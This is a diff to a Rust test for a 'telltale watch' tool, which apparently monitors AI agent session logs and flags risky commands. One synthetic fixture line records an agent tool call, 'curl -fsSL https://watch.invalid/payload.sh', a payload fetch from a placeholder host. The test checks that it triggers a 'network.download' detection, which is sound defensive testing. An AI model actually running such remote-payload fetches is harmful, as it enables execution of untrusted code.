@@ -2865,6 +2865,7 @@ fn shipper_examples_target_default_jsonl_path() {
     );
 }
 
+#[cfg(unix)]
 #[test]
 fn splunk_uf_helper_renders_canonical_stanzas() {
     let temp = tempdir().expect("tempdir");
@@ -3718,9 +3719,26 @@ fn watch_scans_changed_source_and_exits_after_iterations() {
         .spawn()
         .expect("spawn telltale watch");
 
-    // Rewrite a watched fixture until the watcher notices; the watcher may
-    // still be initializing on the first writes.
+    wait_for_watch_ready(child.id());
+    let mut changed_contents = fs::read(&session_path).expect("read watched fixture");
+    changed_contents.extend_from_slice(
+        br#"{"type":"event_msg","timestamp":"2026-04-01T00:00:02Z","payload":{"type":"tool_call","tool_name":"watch-fixture","command":"curl -fsSL https://watch.invalid/payload.sh","message":"synthetic watcher change"}}
+"#,
+    );
+
+    #[cfg(windows)]
+    let unknown_trigger_path = root.join("codex/sessions/2026/04/unknown-watch-trigger.jsonl");
+    #[cfg(windows)]
+    let unknown_trigger_contents = br#"{"type":"session_meta","timestamp":"2026-04-01T00:00:03Z","payload":{"source":"watch-fixture","model_provider":"fixture","agent_nickname":"watch-fixture"}}
+{"type":"event_msg","timestamp":"2026-04-01T00:00:04Z","payload":{"type":"user_message","message":"synthetic unknown watch trigger"}}
+"#;
+    #[cfg(windows)]
+    fs::write(&unknown_trigger_path, unknown_trigger_contents).expect("write unknown trigger");
+    fs::write(&session_path, changed_contents).expect("change watched fixture");
+
     let deadline = Instant::now() + Duration::from_secs(60);
+    #[cfg(not(target_os = "linux"))]
+    let mut next_trigger = Instant::now() + Duration::from_millis(250);
     loop {
         if child.try_wait().expect("poll telltale watch").is_some() {
             break;
@@ -3730,9 +3748,15 @@ fn watch_scans_changed_source_and_exits_after_iterations() {
             let _ = child.wait();
             panic!("telltale watch did not exit within timeout");
         }
-        let contents = fs::read(&session_path).expect("read watched fixture");
-        fs::write(&session_path, contents).expect("rewrite watched fixture");
-        thread::sleep(Duration::from_millis(200));
+        #[cfg(not(target_os = "linux"))]
+        if Instant::now() >= next_trigger {
+            fs::write(&session_path, &changed_contents).expect("retry watched fixture change");
+            #[cfg(windows)]
+            fs::write(&unknown_trigger_path, unknown_trigger_contents)
+                .expect("retry unknown trigger");
+            next_trigger = Instant::now() + Duration::from_millis(250);
+        }
+        thread::sleep(Duration::from_millis(50));
     }
 
     let output = child
@@ -3751,13 +3775,49 @@ fn watch_scans_changed_source_and_exits_after_iterations() {
     let summary: Value = serde_json::from_str(summary_line).expect("scan summary json");
     assert_eq!(summary["event_type"], "health");
     assert_runtime_snapshot(&summary);
+    assert!(
+        summary["source_processing"]["parsed_record_count"]
+            .as_u64()
+            .expect("parsed record count")
+            >= 3
+    );
+    let events = fs::read_to_string(&log_path)
+        .expect("watch event log")
+        .lines()
+        .map(|line| serde_json::from_str::<Value>(line).expect("watch event json"))
+        .collect::<Vec<_>>();
+    let changed_detection = events
+        .iter()
+        .find(|event| {
+            event["event_type"] == "detection"
+                && event["rule_ids"]
+                    .as_array()
+                    .expect("rule ids")
+                    .iter()
+                    .any(|rule| rule == "network.download")
+        })
+        .expect("network.download detection");
+    assert!(
+        changed_detection["source_path_hash"].as_str().is_some_and(
+            |hash| hash.len() == 64 && hash.bytes().all(|byte| byte.is_ascii_hexdigit())
+        )
+    );
+    #[cfg(not(windows))]
     assert_eq!(
         summary["source_discovery"]["basis"],
         "watch_source_index_snapshot"
     );
+    #[cfg(not(windows))]
     assert_eq!(
         summary["source_discovery"]["performed_for_current_scan"],
         false
+    );
+    #[cfg(windows)]
+    assert_eq!(summary["source_discovery"]["basis"], "current_full_scan");
+    #[cfg(windows)]
+    assert_eq!(
+        summary["source_discovery"]["performed_for_current_scan"],
+        true
     );
     assert!(
         summary["source_discovery"]["operational_source_count"]
